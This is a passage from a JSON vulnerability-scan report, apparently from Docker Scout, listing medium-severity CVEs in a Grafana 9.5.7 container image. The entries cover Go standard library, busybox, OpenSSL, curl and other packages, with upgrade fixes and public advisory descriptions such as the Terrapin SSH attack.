          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-24785",
          "value": "CVE-2024-24785",
          "url": "https://scout.docker.com/v/CVE-2024-24785?s=golang&n=stdlib&t=golang&vr=%3C1.21.8"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-24785?s=golang&n=stdlib&t=golang&vr=%3C1.21.8"
        }
      ]
    },
    {
      "id": "28425e51ffaaf2af18c72a5feb14edaf5bb5e9e8f705ab1cb758d7c2b18b3e37",
      "category": "container_scanning",
      "message": "CVE-2023-42363 on alpine/busybox@1.35.0-r29",
      "cve": "CVE-2023-42363",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade alpine/busybox@1.35.0-r29 to 1.35.0-r31",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/busybox@1.35.0-r29?os_name=alpine&os_version=3.17"
          },
          "version": "1.35.0-r29"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-42363",
          "value": "CVE-2023-42363",
          "url": "https://scout.docker.com/v/CVE-2023-42363?s=alpine&n=busybox&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C1.35.0-r31"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-42363?s=alpine&n=busybox&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C1.35.0-r31"
        }
      ]
    },
    {
      "id": "1519be172c6260779cf6fa40c0f6b7da0670e1b71d1be5bbd3d59fa604567612",
      "category": "container_scanning",
      "message": "CVE-2023-42364 on alpine/busybox@1.35.0-r29",
      "cve": "CVE-2023-42364",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade alpine/busybox@1.35.0-r29 to 1.35.0-r31",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/busybox@1.35.0-r29?os_name=alpine&os_version=3.17"
          },
          "version": "1.35.0-r29"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-42364",
          "value": "CVE-2023-42364",
          "url": "https://scout.docker.com/v/CVE-2023-42364?s=alpine&n=busybox&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C1.35.0-r31"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-42364?s=alpine&n=busybox&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C1.35.0-r31"
        }
      ]
    },
    {
      "id": "05039810afee765fc040d738268c54f969a61a5063fb20f0e7ed4dc1fa7ac5cd",
      "category": "container_scanning",
      "message": "CVE-2023-42365 on alpine/busybox@1.35.0-r29",
      "cve": "CVE-2023-42365",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade alpine/busybox@1.35.0-r29 to 1.35.0-r31",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/busybox@1.35.0-r29?os_name=alpine&os_version=3.17"
          },
          "version": "1.35.0-r29"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-42365",
          "value": "CVE-2023-42365",
          "url": "https://scout.docker.com/v/CVE-2023-42365?s=alpine&n=busybox&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C1.35.0-r31"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-42365?s=alpine&n=busybox&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C1.35.0-r31"
        }
      ]
    },
    {
      "id": "d2b539c87eca5a09e14dac92b1947e981e8b3408cdc48dc14d2fa3e9363667fe",
      "category": "container_scanning",
      "message": "CVE-2023-42366 on alpine/busybox@1.35.0-r29",
      "cve": "CVE-2023-42366",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade alpine/busybox@1.35.0-r29 to 1.35.0-r30",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/busybox@1.35.0-r29?os_name=alpine&os_version=3.17"
          },
          "version": "1.35.0-r29"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-42366",
          "value": "CVE-2023-42366",
          "url": "https://scout.docker.com/v/CVE-2023-42366?s=alpine&n=busybox&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C1.35.0-r30"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-42366?s=alpine&n=busybox&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C1.35.0-r30"
        }
      ]
    },
    {
      "id": "14f881384ee2929314ce7d5c4ec4f6b56e29ca8bd7126f295649f4062a2fd05b",
      "category": "container_scanning",
      "message": "CVE-2024-0727 on alpine/openssl@3.0.9-r1",
      "cve": "CVE-2024-0727",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade alpine/openssl@3.0.9-r1 to 3.0.12-r4",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/openssl@3.0.9-r1?os_name=alpine&os_version=3.17"
          },
          "version": "3.0.9-r1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-0727",
          "value": "CVE-2024-0727",
          "url": "https://scout.docker.com/v/CVE-2024-0727?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.12-r4"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-0727?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.12-r4"
        }
      ]
    },
    {
      "id": "4e25e463800baf0570b974af1162f43abd5eef575ce190e6fd50655cac6588c1",
      "category": "container_scanning",
      "message": "CVE-2024-24789 on stdlib@1.20.6",
      "description": "The archive/zip package's handling of certain types of invalid zip files differs from the behavior of most zip implementations. This misalignment could be exploited to create an zip file with contents that vary depending on the implementation reading the file. The archive/zip package now rejects files containing these errors.",
      "cve": "CVE-2024-24789",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.21.11",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-24789",
          "value": "CVE-2024-24789",
          "url": "https://scout.docker.com/v/CVE-2024-24789?s=golang&n=stdlib&t=golang&vr=%3C1.21.11"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-24789?s=golang&n=stdlib&t=golang&vr=%3C1.21.11"
        }
      ]
    },
    {
      "id": "59c898954e0637d6df657991469a8a9f117c833f20a91387513151ab507fd66e",
      "category": "container_scanning",
      "message": "CVE-2025-0913 on stdlib@1.20.6",
      "description": "os.OpenFile(path, os.O_CREATE|O_EXCL) behaved differently on Unix and Windows systems when the target path was a dangling symlink. On Unix systems, OpenFile with O_CREATE and O_EXCL flags never follows symlinks. On Windows, when the target path was a symlink to a nonexistent location, OpenFile would create a file in that location. OpenFile now always returns an error when the O_CREATE and O_EXCL flags are both set and the target path is a symlink.",
      "cve": "CVE-2025-0913",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.23.10",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2025-0913",
          "value": "CVE-2025-0913",
          "url": "https://scout.docker.com/v/CVE-2025-0913?s=golang&n=stdlib&t=golang&vr=%3C1.23.10"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2025-0913?s=golang&n=stdlib&t=golang&vr=%3C1.23.10"
        }
      ]
    },
    {
      "id": "9d107b3bfa85d29024d7085fd421ab33537c1ca0c7f3274935e31a0bb49d40d0",
      "category": "container_scanning",
      "message": "CVE-2020-8911 on github.com/aws/aws-sdk-go@1.44.234",
      "description": "A padding oracle vulnerability exists in the AWS S3 Crypto SDK for GoLang versions prior to V2. The SDK allows users to encrypt files with AES-CBC without computing a Message Authentication Code (MAC), which then allows an attacker who has write access to the target's S3 bucket and can observe whether or not an endpoint with access to the key can decrypt a file, they can reconstruct the plaintext with (on average) 128*length (plaintext) queries to the endpoint, by exploiting CBC's ability to manipulate the bytes of the next block and PKCS5 padding errors. It is recommended to update your SDK to V2 or later, and re-encrypt your files.",
      "cve": "CVE-2020-8911",
      "severity": "Medium",
      "confidence": "Unknown",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/github.com/aws/aws-sdk-go@1.44.234"
          },
          "version": "1.44.234"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2020-8911",
          "value": "CVE-2020-8911",
          "url": "https://scout.docker.com/v/CVE-2020-8911?s=golang&n=aws-sdk-go&ns=github.com%2Faws&t=golang&vr=%3E%3D0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2020-8911?s=golang&n=aws-sdk-go&ns=github.com%2Faws&t=golang&vr=%3E%3D0"
        }
      ]
    },
    {
      "id": "7383a54b5a153ece24915011298def3bb54408533cc320dc12bfc1e53bfe48a1",
      "category": "container_scanning",
      "message": "CVE-2023-48795 on golang.org/x/crypto@0.7.0",
      "description": "### Summary\n\nTerrapin is a prefix truncation attack targeting the SSH protocol. More precisely, Terrapin breaks the integrity of SSH's secure channel. By carefully adjusting the sequence numbers during the handshake, an attacker can remove an arbitrary amount of messages sent by the client or server at the beginning of the secure channel without the client or server noticing it.\n\n### Mitigations\n\nTo mitigate this protocol vulnerability, OpenSSH suggested a so-called \"strict kex\" which alters the SSH handshake to ensure a Man-in-the-Middle attacker cannot introduce unauthenticated messages as well as convey sequence number manipulation across handshakes.\n\n**Warning: To take effect, both the client and server must support this countermeasure.** \n\nAs a stop-gap measure, peers may also (temporarily) disable the affected algorithms and use unaffected alternatives like AES-GCM instead until patches are available.\n\n### Details\n\nThe SSH specifications of ChaCha20-Poly1305 (chacha20-poly1305@openssh.com) and Encrypt-then-MAC (*-etm@openssh.com MACs) are vulnerable against an arbitrary prefix truncation attack (a.k.a. Terrapin attack). This allows for an extension negotiation downgrade by stripping the SSH_MSG_EXT_INFO sent after the first message after SSH_MSG_NEWKEYS, downgrading security, and disabling attack countermeasures in some versions of OpenSSH. When targeting Encrypt-then-MAC, this attack requires the use of a CBC cipher to be practically exploitable due to the internal workings of the cipher mode. Additionally, this novel attack technique can be used to exploit previously unexploitable implementation flaws in a Man-in-the-Middle scenario.\n\nThe attack works by an attacker injecting an arbitrary number of SSH_MSG_IGNORE messages during the initial key exchange and consequently removing the same number of messages just after the initial key exchange has concluded. This is possible due to missing authentication of the excess SSH_MSG_IGNORE messages and the fact that the implicit sequence numbers used within the SSH protocol are only checked after the initial key exchange.\n\nIn the case of ChaCha20-Poly1305, the attack is guaranteed to work on every connection as this cipher does not maintain an internal state other than the message's sequence number. In the case of Encrypt-Then-MAC, practical exploitation requires the use of a CBC cipher; while theoretical integrity is broken for all ciphers when using this mode, message processing will fail at the application layer for CTR and stream ciphers.\n\nFor more details see [https://terrapin-attack.com](https://terrapin-attack.com). \n\n### Impact\n\nThis attack targets the specification of ChaCha20-Poly1305 (chacha20-poly1305@openssh.com) and Encrypt-then-MAC (*-etm@openssh.com), which are widely adopted by well-known SSH implementations and can be considered de-facto standard. These algorithms can be practically exploited; however, in the case of Encrypt-Then-MAC, we additionally require the use of a CBC cipher. As a consequence, this attack works against all well-behaving SSH implementations supporting either of those algorithms and can be used to downgrade (but not fully strip) connection security in case SSH extension negotiation (RFC8308) is supported. The attack may also enable attackers to exploit certain implementation flaws in a man-in-the-middle (MitM) scenario.",
      "cve": "CVE-2023-48795",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade golang.org/x/crypto@0.7.0 to 0.17.0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/golang.org/x/crypto@0.7.0"
          },
          "version": "0.7.0"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-48795",
          "value": "CVE-2023-48795",
          "url": "https://scout.docker.com/v/CVE-2023-48795?s=github&n=crypto&ns=golang.org%2Fx&t=golang&vr=%3E%3D0.1.0%2C%3C0.17.0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-48795?s=github&n=crypto&ns=golang.org%2Fx&t=golang&vr=%3E%3D0.1.0%2C%3C0.17.0"
        }
      ]
    },
    {
      "id": "7ff835de9136e0088e55a961803f98bd901b80d69057f9a75964f3ae05f5b8c5",
      "category": "container_scanning",
      "message": "CVE-2023-6237 on alpine/openssl@3.0.9-r1",
      "cve": "CVE-2023-6237",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade alpine/openssl@3.0.9-r1 to 3.0.12-r3",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/openssl@3.0.9-r1?os_name=alpine&os_version=3.17"
          },
          "version": "3.0.9-r1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-6237",
          "value": "CVE-2023-6237",
          "url": "https://scout.docker.com/v/CVE-2023-6237?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.12-r3"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-6237?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.12-r3"
        }
      ]
    },
    {
      "id": "d41eca2f86efd7ce0d7584e5f811f5d34a25c07fb4630bcb3359373357748243",
      "category": "container_scanning",
      "message": "CVE-2024-24783 on stdlib@1.20.6",
      "description": "Verifying a certificate chain which contains a certificate with an unknown public key algorithm will cause Certificate.Verify to panic.\n\nThis affects all crypto/tls clients, and servers that set Config.ClientAuth to VerifyClientCertIfGiven or RequireAndVerifyClientCert. The default behavior is for TLS servers to not verify client certificates.",
      "cve": "CVE-2024-24783",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.21.8",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-24783",
          "value": "CVE-2024-24783",
          "url": "https://scout.docker.com/v/CVE-2024-24783?s=golang&n=stdlib&t=golang&vr=%3C1.21.8"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-24783?s=golang&n=stdlib&t=golang&vr=%3C1.21.8"
        }
      ]
    },
    {
      "id": "ade146051c01c0238df61afbf258576756f3c6803e15d63a87dbc93930868a74",
      "category": "container_scanning",
      "message": "CVE-2024-2511 on alpine/openssl@3.0.9-r1",
      "cve": "CVE-2024-2511",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade alpine/openssl@3.0.9-r1 to 3.0.12-r5",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/openssl@3.0.9-r1?os_name=alpine&os_version=3.17"
          },
          "version": "3.0.9-r1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-2511",
          "value": "CVE-2024-2511",
          "url": "https://scout.docker.com/v/CVE-2024-2511?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.12-r5"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-2511?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.12-r5"
        }
      ]
    },
    {
      "id": "5c514f287fc5254db25cd3cbcda786e4dbb8209ed0f7ce5799e8d048dffb4ea1",
      "category": "container_scanning",
      "message": "CVE-2023-39318 on stdlib@1.20.6",
      "description": "The html/template package does not properly handle HTML-like \"\" comment tokens, nor hashbang \"#!\" comment tokens, in <script> contexts. This may cause the template parser to improperly interpret the contents of <script> contexts, causing actions to be improperly escaped. This may be leveraged to perform an XSS attack.",
      "cve": "CVE-2023-39318",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.20.8",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-39318",
          "value": "CVE-2023-39318",
          "url": "https://scout.docker.com/v/CVE-2023-39318?s=golang&n=stdlib&t=golang&vr=%3C1.20.8"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-39318?s=golang&n=stdlib&t=golang&vr=%3C1.20.8"
        }
      ]
    },
    {
      "id": "7d7b6567da7113330f5abbfca2b5b0780db07e7f740ad5aee4a7701c39813ac7",
      "category": "container_scanning",
      "message": "CVE-2023-39319 on stdlib@1.20.6",
      "description": "The html/template package does not apply the proper rules for handling occurrences of \"<script\", \"<!--\", and \"</script\" within JS literals in <script> contexts. This may cause the template parser to improperly consider script contexts to be terminated early, causing actions to be improperly escaped. This could be leveraged to perform an XSS attack.",
      "cve": "CVE-2023-39319",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.20.8",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-39319",
          "value": "CVE-2023-39319",
          "url": "https://scout.docker.com/v/CVE-2023-39319?s=golang&n=stdlib&t=golang&vr=%3C1.20.8"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-39319?s=golang&n=stdlib&t=golang&vr=%3C1.20.8"
        }
      ]
    },
    {
      "id": "e6b1fce7b261c7b873578fba4570ee864019e295586f68108c9b24cfaf9eddf0",
      "category": "container_scanning",
      "message": "CVE-2023-3978 on golang.org/x/net@0.8.0",
      "description": "Text nodes not in the HTML namespace are incorrectly literally rendered, causing text which should be escaped to not be. This could lead to an XSS attack. ",
      "cve": "CVE-2023-3978",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade golang.org/x/net@0.8.0 to 0.13.0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/golang.org/x/net@0.8.0"
          },
          "version": "0.8.0"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-3978",
          "value": "CVE-2023-3978",
          "url": "https://scout.docker.com/v/CVE-2023-3978?s=github&n=net&ns=golang.org%2Fx&t=golang&vr=%3C0.13.0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-3978?s=github&n=net&ns=golang.org%2Fx&t=golang&vr=%3C0.13.0"
        }
      ]
    },
    {
      "id": "1eff669f5a009f1619fbeb946a66e80adf7023f6b65990feb0c10839517fa263",
      "category": "container_scanning",
      "message": "CVE-2024-45336 on stdlib@1.20.6",
      "description": "The HTTP client drops sensitive headers after following a cross-domain redirect. For example, a request to a.com/ containing an Authorization header which is redirected to b.com/ will not send that header to b.com.\n\nIn the event that the client received a subsequent same-domain redirect, however, the sensitive headers would be restored. For example, a chain of redirects from a.com/, to b.com/1, and finally to b.com/2 would incorrectly send the Authorization header to b.com/2.",
      "cve": "CVE-2024-45336",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.22.11",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-45336",
          "value": "CVE-2024-45336",
          "url": "https://scout.docker.com/v/CVE-2024-45336?s=golang&n=stdlib&t=golang&vr=%3C1.22.11"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-45336?s=golang&n=stdlib&t=golang&vr=%3C1.22.11"
        }
      ]
    },
    {
      "id": "ec9acfc8875d9bf7f72f96296ad0927594a56a3f771c855374a871bfc0414531",
      "category": "container_scanning",
      "message": "CVE-2024-45341 on stdlib@1.20.6",
      "description": "A certificate with a URI which has a IPv6 address with a zone ID may incorrectly satisfy a URI name constraint that applies to the certificate chain.\n\nCertificates containing URIs are not permitted in the web PKI, so this only affects users of private PKIs which make use of URIs.",
      "cve": "CVE-2024-45341",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.22.11",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-45341",
          "value": "CVE-2024-45341",
          "url": "https://scout.docker.com/v/CVE-2024-45341?s=golang&n=stdlib&t=golang&vr=%3C1.22.11"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-45341?s=golang&n=stdlib&t=golang&vr=%3C1.22.11"
        }
      ]
    },
    {
      "id": "1430a06a7fd665da8fd01bbaade48679c19c51411d1d32d0bc0cbb603984f73f",
      "category": "container_scanning",
      "message": "CVE-2024-2379 on alpine/curl@8.2.0-r1",
      "cve": "CVE-2024-2379",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade alpine/curl@8.2.0-r1 to 8.7.1-r0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/curl@8.2.0-r1?os_name=alpine&os_version=3.17"
          },
          "version": "8.2.0-r1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-2379",
          "value": "CVE-2024-2379",
          "url": "https://scout.docker.com/v/CVE-2024-2379?s=alpine&n=curl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C8.7.1-r0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-2379?s=alpine&n=curl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C8.7.1-r0"
        }
      ]
    },
    {
      "id": "fc1fb70f356d94efee317827654cf5edbe6c370cde9e9746b9eec2b48e911492",
      "category": "container_scanning",
      "message": "CVE-2023-45290 on stdlib@1.20.6",
      "description": "When parsing a multipart form (either explicitly with Request.ParseMultipartForm or implicitly with Request.FormValue, Request.PostFormValue, or Request.FormFile), limits on the total size of the parsed form were not applied to the memory consumed while reading a single form line. This permits a maliciously crafted input containing very long lines to cause allocation of arbitrarily large amounts of memory, potentially leading to memory exhaustion.\n\nWith fix, the ParseMultipartForm function now correctly limits the maximum size of form lines.",
      "cve": "CVE-2023-45290",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.21.8",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-45290",
          "value": "CVE-2023-45290",
          "url": "https://scout.docker.com/v/CVE-2023-45290?s=golang&n=stdlib&t=golang&vr=%3C1.21.8"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-45290?s=golang&n=stdlib&t=golang&vr=%3C1.21.8"
        }
      ]
    },
    {
      "id": "5460d76d5e4044c8076ee9d8227ff236cb2484f67f92ec457bd8f4ab4710ce9c",
      "category": "container_scanning",
      "message": "CVE-2023-46218 on alpine/curl@8.2.0-r1",
      "cve": "CVE-2023-46218",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade alpine/curl@8.2.0-r1 to 8.5.0-r0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/curl@8.2.0-r1?os_name=alpine&os_version=3.17"
          },
          "version": "8.2.0-r1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-46218",
          "value": "CVE-2023-46218",
          "url": "https://scout.docker.com/v/CVE-2023-46218?s=alpine&n=curl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C8.5.0-r0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-46218?s=alpine&n=curl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C8.5.0-r0"
        }
      ]
    },
    {
      "id": "039e48d7731b9dd012343b60b695f624188684d0376d2f2e2be7f0d5c55c1dba",
      "category": "container_scanning",
      "message": "CVE-2023-6129 on alpine/openssl@3.0.9-r1",
      "cve": "CVE-2023-6129",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade alpine/openssl@3.0.9-r1 to 3.0.12-r2",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/openssl@3.0.9-r1?os_name=alpine&os_version=3.17"
          },
          "version": "3.0.9-r1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-6129",
          "value": "CVE-2023-6129",
          "url": "https://scout.docker.com/v/CVE-2023-6129?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.12-r2"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-6129?s=alpine&n=openssl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C3.0.12-r2"
        }
      ]
    },
    {
      "id": "22a08f46329a6265c0c22cbb47f81ab3054fd97d5569a5a5c15d88191bce030e",
      "category": "container_scanning",
      "message": "CVE-2024-2466 on alpine/curl@8.2.0-r1",
      "cve": "CVE-2024-2466",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade alpine/curl@8.2.0-r1 to 8.7.1-r0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/curl@8.2.0-r1?os_name=alpine&os_version=3.17"
          },
          "version": "8.2.0-r1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-2466",
          "value": "CVE-2024-2466",
          "url": "https://scout.docker.com/v/CVE-2024-2466?s=alpine&n=curl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C8.7.1-r0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-2466?s=alpine&n=curl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C8.7.1-r0"
        }
      ]
    },
    {
      "id": "16410d773871b7d44a109c20da5bf352df6675371608bb90a7f846342ff37f5d",
      "category": "container_scanning",
      "message": "CVE-2024-7264 on alpine/curl@8.2.0-r1",
      "cve": "CVE-2024-7264",
      "severity": "Medium",
      "confidence": "Unknown",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
